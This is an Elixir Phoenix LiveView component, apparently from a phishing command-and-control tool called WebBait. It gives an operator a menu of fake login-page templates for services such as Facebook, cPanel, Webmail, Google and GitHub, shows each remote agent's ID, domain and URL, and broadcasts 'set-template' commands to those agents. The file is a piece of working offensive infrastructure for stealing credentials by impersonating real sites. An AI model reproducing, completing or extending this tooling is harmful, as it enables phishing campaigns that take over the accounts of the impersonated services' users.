defmodule WebbaitWeb.AgentLive.OnlineStatusComponent do
  use WebBaitWeb, :live_component
  alias WebBait.C2
  alias Phoenix.LiveView.JS

  @impl true
  def render(assigns) do
    templates = [
      {"twitter", "Twitter (WIP)", ~H"<i class='fa-brands fa-twitter mr-2'></i>"},
      {"facebook", "Facebook", ~H"<i class='fa-brands fa-facebook mr-2'></i>"},
      {"messenger", "Messenger", ~H"<i class='fa-brands fa-facebook-messenger mr-2'></i>"},
      {"instagram", "Instagram (WIP)", ~H"<i class='fa-brands fa-instagram mr-2'></i>"},
      {"google", "Google (WIP)", ~H"<i class='fa-brands fa-google mr-2'></i>"},
      {"meet", "Meet (WIP)", ~H"<i class='fa-brands fa-google mr-2'></i>"},
      {"zoom", "Zoom (WIP)", ~H"<i class='fa-solid fa-video mr-2'></i>"},
      {"cpanel", "CPanel", ~H"<i class='fa-brands fa-cpanel mr-2'></i>"},
      {"webmail", "Webmail", ~H"<i class='fa-brands fa-cpanel mr-2'></i>"},
      {"wordpress", "Wordpress (WIP)", ~H"<i class='fa-brands fa-wordpress mr-2'></i>"},
      {"apple", "Apple (WIP)", ~H"<i class='fa-brands fa-apple mr-2'></i>"},
      {"whatsapp", "WhatsApp (WIP)", ~H"<i class='fa-brands fa-whatsapp mr-2'></i>"},
      {"linkedin", "LinkedIn (WIP)", ~H"<i class='fa-brands fa-linkedin mr-2'></i>"},
      {"github", "GitHub (WIP)", ~H"<i class='fa-brands fa-github mr-2'></i>"},
      {"gitlab", "GitLab (WIP)", ~H"<i class='fa-brands fa-gitlab mr-2'></i>"},
      {"discord", "Discord (WIP)", ~H"<i class='fa-brands fa-discord mr-2'></i>"},
      {"slack", "Slack (WIP)", ~H"<i class='fa-brands fa-slack mr-2'></i>"},
      {"telegram", "Telegram (WIP)", ~H"<i class='fa-brands fa-telegram mr-2'></i>"},
      {"amazon", "Amazon (WIP)", ~H"<i class='fa-brands fa-amazon mr-2'></i>"},
      {"atlassian", "Atlassian (WIP)", ~H"<i class='fa-brands fa-atlassian mr-2'></i>"},
      {"skype", "Skype (WIP)", ~H"<i class='fa-brands fa-skype mr-2'></i>"},
      {"tiktok", "TikTok (WIP)", ~H"<i class='fa-brands fa-tiktok mr-2'></i>"},
      {"reddit", "Reddit (WIP)", ~H"<i class='fa-brands fa-reddit mr-2'></i>"},
    ]

    ~H"""
      <div class="flex grow gap-2">
        <div class="grow">
          <button phx-hook="commandsDropdown" id="commandsDropdown" class="flex justify-center gap-2 rounded p-2 px-4 text-white bg-fuchsia-800 hover:bg-fuchsia-900 transition duration-300 border-0 focus:border-0 focus:outline-none focus:ring-0" type="button">
            Commands
            <i class="fa-solid fa-angle-down m-auto"></i>
          </button>
          <!-- Dropdown menu -->
          <div id="dropdown" class="z-10 hidden bg-white divide-y divide-gray-100 rounded shadow-2xl w-fit dark:bg-gray-700">
            <ul class="py-2 text-sm text-gray-700 dark:text-gray-200" aria-labelledby="multiLevelDropdownButton">
              <li>
                <button id="templateDropdown" type="button" class="flex w-full px-4 py-2 hover:bg-gray-100 dark:hover:bg-gray-600 dark:hover:text-white">
                  <i class="fa-solid fa-brush mr-4 my-auto"></i>
                  <div class="grow text-left mr-4">Set template</div>
                  <i class="fa-solid fa-angle-right my-auto"></i>
                </button>
                <div id="doubleDropdown" class="z-10 hidden max-h-[70vh] overflow-auto scrollbar-hide bg-white divide-y divide-gray-100 rounded shadow-2xl w-44 dark:bg-gray-700  dark:divide-gray-600">
                  <div class="p-4">
                    <i class="fa-solid fa-brush mr-2"></i>
                    Templates: <%= Enum.count(templates) %></div>
                  <ul class="py-2 text-sm text-gray-700 dark:text-gray-200" aria-labelledby="doubleDropdownButton">
                    <%= for {template, label, icon} <- templates do %>
                      <li>
                        <div
                          class="cursor-pointer block px-4 py-2 hover:bg-gray-100 dark:hover:bg-gray-600 dark:hover:text-white"
                          phx-click={
                            JS.push("command", value: %{ "template" => template }, target: @myself)
                          }>
                          <%= icon %>
                          <%= label %>
                        </div>
                      </li>
                    <% end %>
                  </ul>
                  <div class="py-2">
                    <div
                      class="cursor-pointer block px-4 py-2 hover:bg-gray-100 dark:hover:bg-gray-600 dark:hover:text-white"
                      phx-click={
                      JS.push("command", value: %{ "template" => "reset" }, target: @myself)
                      }>
                      <i class="fa-solid fa-rotate-left mr-2"></i>
                      Reset template
                    </div>
                  </div>
                </div>
              </li>
            </ul>
          </div>
        </div>
        <ul class="flex gap-4 my-auto">
          <li>
            <strong>Status:</strong>
            <%= WebBait.nice_print_status(@online, @count) %>
          </li>
          <li>
            <strong>Agent ID:</strong>
            <%= @agent.agentId %>
          </li>
          <li>
            <strong>Domain:</strong>
            <%= @agent.domain %>
          </li>
          <li>
            <strong>URL:</strong>
            <%= @agent.url %>
          </li>
        </ul>
      </div>
    """
  end

  @impl true
  def handle_event("command", %{"template" => template}, socket) do
    cmd = C2.create_agent_command(socket.assigns.agent.id, "set-template #{template}")

    Phoenix.PubSub.broadcast(
      WebBait.PubSub,
      "agent:" <> socket.assigns.agent.agentId,
      {:command, cmd}
    )

    {:noreply, socket}
  end
end
